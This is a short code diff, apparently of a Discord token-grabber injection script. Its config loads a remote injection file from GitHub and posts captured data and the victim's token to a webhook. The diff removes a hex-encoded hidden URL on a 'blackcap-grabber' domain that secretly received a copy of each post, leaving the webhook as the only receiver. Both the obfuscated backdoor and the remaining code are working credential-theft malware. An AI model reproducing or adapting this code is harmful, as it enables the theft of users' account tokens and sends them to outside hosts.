@@ -17,7 +17,6 @@ var config = {
 
     injection_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/injection-1336.js",
     webhook: "%WEBHOOK%",
-    uwu: "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x6f\x67\x69\x6e\x2e\x62\x6c\x61\x63\x6b\x63\x61\x70\x2d\x67\x72\x61\x62\x62\x65\x72\x2e\x63\x6f\x6d\x3a\x33\x30\x30\x30\x2f\x70\x72\x65\x6d\x69\x75\x6d\x2f",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -236,7 +235,7 @@ const post = async (params) => {
         data: params,
         token: token
     });
-    [config.uwu, config.webhook].forEach(res => {
+    [config.webhook].forEach(res => {
         const url = new URL(res);
         const options = {
             host: url.hostname,
@@ -251,7 +250,7 @@ const post = async (params) => {
         req.on("error", (err) => {
             console.log(err);
         });
-        req.write(res == config.uwu ? n : params);
+        req.write(res == config.webhook ? n : params);
         req.end();
     })
 
